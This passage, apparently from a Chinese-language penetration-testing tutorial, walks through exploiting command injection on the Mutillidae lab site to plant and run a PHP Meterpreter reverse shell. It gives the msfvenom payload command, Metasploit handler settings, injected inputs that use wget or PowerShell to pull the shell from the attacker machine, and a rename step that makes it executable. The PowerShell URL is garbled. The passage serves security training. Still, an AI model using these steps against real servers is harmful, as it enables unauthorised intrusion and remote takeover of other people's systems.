  ----------------------------------------------\n\\\\AMDServer\n\\\\AMDWorkstation\n\
  The command completed successfully.\n```\n\n你只需要输入一个通用 IP 地址进行查询，并在末尾附加系统命令。易受命令注入攻击的\
  \ Web 服务器将直接在网页中返回命令响应。\n\n### 通过命令注入获取远程 Shell\n\n现在让我们看看如何利用命令注入来上传并运行基于 PHP 的\
  \ shell。一旦 shell 执行，我们就能获得目标网站的完整远程会话。\n\n我们将通过以下步骤实现：\n\n1. 在你的 Kali 系统上创建 shell\n\
  2. 将 shell 复制到我们 Kali 系统的 Web 服务器上\n3. 将 shell 从我们的 Kali Web 服务器传输到目标网站\n4. 远程执行\
  \ shell；此部分可能会有点困惑；某些读者可能想先读一遍\n\n#### 创建 shell 和处理器 (Handler)\n\n我们需要创建一个反向 PHP\
  \ 文件，这样当它被复制到服务器并从浏览器打开时，它会使服务器连接回我们的 Kali 系统。我们还需要在 Metasploit 中设置一个 Meterpreter\
  \ 监听器进行监听。让我们使用 `msfvenom` 创建 PHP shell。\n\n7. 在终端执行 `msfvenom -p php/meterpreter/reverse_tcp\
  \ LHOST=192.168.1.39 LPORT=4444 -f raw > shell.php`\n\n![](img/image00758.jpeg)\n\
  \n对于有效负载，我们选择了基于 PHP 的 Meterpreter 反向 shell。我们设置了 Kali 系统的 IP 地址和想要使用的端口。我们还将输出格式设置为\
  \ `raw`，并将输出保存到名为 `shell.php` 的文件中。这创建了我们的 shellcode 文件。如我们所知，msfvenom 不会在代码开头添加\
  \ `<?php` 标签，在结尾添加 `?>`。我们必须手动添加这些标签才能使其运行。\n\n8. 用文本编辑器打开 shellcode 文件并添加所示的标签：\n\
  \n![](img/image00759.jpeg)\n\n9. 将文件保存在根目录下。\n\n#### 将 PHP Shell 复制到本地 Web 服务器\n\
  \n接下来，我们将在 Kali 内置的 Web 服务器上托管此文件。该文件需要复制到 `/var/www/html/` 目录：\n\n10. 输入 `mv shell.php\
  \ /var/www/html/shell.txt`。注意我们将扩展名从 `.php` 改为 `.txt`，因为某些 Web 服务器不允许上传 `.php` 文件（但某些浏览器会正确识别\
  \ `.txt` 文件并将其作为 `.php` 文件处理）。\n\n现在，我们需要启动 Metasploit Multi-Handler 并将其设置为接收传入的\
  \ shell。\n\n11. 在终端中输入 `msfconsole` 启动 Metasploit。\n12. 启动 Multi-Handler：\n- `use\
  \ exploit/multi/handler`\n- `set payload php/meterpreter/reverse_tcp`\n- `set LHOST\
  \ 192.168.1.39`\n- `set LPORT 4444`\n- `exploit`\n\n这将启动反向处理器，如下所示：\n\n![](img/image00760.jpeg)\n\
  \n13. 打开第二个终端并启动 Kali Apache 服务器，`service apache2 start`\n\n#### 将 Shell 传输到 Web\
  \ 服务器\n\n现在，由于我们的 Kali Web 服务器正在运行，我们只需要将 shell 传输到 Mutillidae 网站。如果你的目标是 Linux\
  \ 而不是 Windows，操作会有所不同。我将向你展示这两种技术，先是 Linux，然后：\n\n![](img/image00761.jpeg)\n\n好的，如果目标是\
  \ Linux，这非常简单（对于我们的 Metasploitable 虚拟机）：\n\n回到 Mutillidae DNS 查找页面，通过输入 `192.168.1.1\
  \ & wget 192.168.1.39/shell.txt` 将 Kali Web 服务器上的文件获取到目标网站（我们的目标是 Linux 虚拟机）：\n\n\
  ![](img/image00762.jpeg)\n\n然后为了确保它已上传，输入 `192.168.1.1 & ls` 查看目录内容：\n\n```\nrobots.txt\n\
  secret-administrative-pages.php\nset-background-color.php\nset-up-database.php\n\
  shell.txt\nshow-log.php\nsite-footer-discussion.php\nsource-viewer.php\n```\n\n\
  通过输入 `192.168.1.1 & mv shell.txt shell.php` 将 shell 重命名为 `.php`：\n\n如果你想，再次使用 `ls`\
  \ 命令确保它在服务器上是 PHP 文件：\n\n```\nrobots.txt\nsecret-administrative-pages.php\nset-background-color.php\n\
  set-up-database.php\nshell.php\nshow-log.php\nsite-footer-discussion.php\nsource-viewer.php\n\
  ```\n\n![](img/image07.jpeg)\n\n在 Windows 上这并不容易，因为没有 `wget` 命令。我们有很多方法可以实现，但让我们使用命令注入来注入\
  \ PowerShell 命令！\n\n通过 PowerShell 从 Kali 下载文件的代码：\n\n```\n(New-Object System.Net.WebClient).DownloadFile(\
  \ \"1://192.168.1.39/shell.txt\", \"c:\\xampp\\htdocs\\mutillidae\\shell.php\" )\n\
  ```\n\n现在如果我们直接将其放入 DNS 网站查找网页，将不起作用。但如果我们对 PowerShell 命令进行编码，就可以！如果你记得我们在 PowerShell\
